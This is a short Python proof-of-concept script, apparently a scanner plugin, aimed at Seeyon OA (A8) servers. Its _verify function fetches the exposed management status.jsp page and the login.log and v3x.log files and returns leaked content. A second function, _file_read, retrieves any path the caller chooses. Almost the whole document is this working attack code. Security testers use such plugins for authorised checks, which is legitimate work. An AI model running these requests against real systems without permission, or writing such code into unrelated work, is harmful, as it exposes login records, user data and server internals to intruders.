import requests
import traceback

def _verify(target):
    url = target["target"]
    # 测试 status.jsp 信息泄露
    status_url = f"{url}/seeyon/management/status.jsp"
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    try:
        resp = requests.get(status_url, headers=headers, timeout=10, verify=False)
        if resp.status_code == 200 and ('A8' in resp.text or 'JVM' in resp.text or 'Online Users' in resp.text):
            return {'target': url, 'result': f'status.jsp 信息泄露，页面内容（部分）：{resp.text[:500]}'}
    except:
        raise RuntimeError(traceback.format_exc())
    # 尝试 login.log 和 v3x.log
    logs = ['/seeyon/logs/login.log', '/seeyon/logs/v3x.log']
    for log_path in logs:
        try:
            log_url = f"{url}{log_path}"
            resp = requests.get(log_url, headers=headers, timeout=10, verify=False)
            if resp.status_code == 200 and len(resp.text) > 0:
                return {'target': url, 'result': f'{log_path} 可访问，内容（部分）：{resp.text[:500]}'}
        except:
            pass
    # 如果都没发现
    return None

def _file_read(target, path):
    url = target["target"]
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    full_url = f"{url}{path}" if path.startswith('/') else f"{url}/{path}"
    try:
        resp = requests.get(full_url, headers=headers, timeout=10, verify=False)
        if resp.status_code == 200:
            return {'target': url, 'result': resp.text[:2000]}
        else:
            return {'target': url, 'result': f'访问失败，状态码：{resp.status_code}'}
    except:
        raise RuntimeError(traceback.format_exc())

if __name__ == "__main__":
    print(_verify({'target':'http://example.com'}))